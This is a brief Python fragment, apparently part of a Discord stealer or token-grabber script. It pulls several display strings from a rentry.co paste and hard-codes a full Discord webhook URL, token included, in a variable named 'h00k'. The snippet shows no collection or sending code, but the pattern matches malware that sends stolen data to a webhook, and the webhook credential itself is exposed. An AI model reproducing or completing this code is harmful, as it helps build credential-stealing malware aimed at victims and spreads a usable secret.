...
cname = "https://rentry.co/qbtghfg6/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

smallcname = "https://rentry.co/qbtghfg6/raw"
smallcnameresp = requests.get(smallcname)
smallcname = smallcnameresp.text

footerc = "https://rentry.co/qbtghfg6/raw"
footercresp = requests.get(footerc)
footerc = footercresp.text

words = "https://rentry.co/qbtghfg6/raw"
wordsresp = requests.get(words)
words = wordsresp.text

h00k = "https://discord.com/api/webhooks/1252566785451098183/ZHKN1oiZSnXd7K8UchL11CcMMvZ5s8-VVL09DzwKovDd0Z1oooEO7uBsxZVsKoY8hWej"
